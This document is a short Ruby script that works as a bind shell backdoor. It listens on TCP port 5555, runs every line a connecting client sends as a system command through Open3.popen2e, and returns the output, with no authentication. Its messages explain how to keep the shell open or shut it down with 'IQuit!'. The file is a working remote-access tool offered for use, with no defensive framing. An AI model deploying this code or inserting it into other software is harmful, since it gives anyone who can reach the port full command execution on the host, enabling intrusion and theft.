#!/usr/bin/env ruby

require 'socket'
require 'open3'

Socket.tcp_server_loop(5555) do |sock, client_addrinfo|
  begin
  while command = sock.gets
    Open3.popen2e("#{command}") do | stdin, stdout_and_stderr |
      IO.copy_stream(stdout_and_stderr, sock)
      end  
      end
   rescue
  break if command =~ /IQuit!/
  sock.write "Command or file not found.\n"
  sock.write "Type IQuit! to kill the shell forever on the server.\n"
  sock.write "Use ^] or ctl+C (telnet or nc) to exit and keep it open.\n"
  retry
   ensure
     sock.close
  end
end
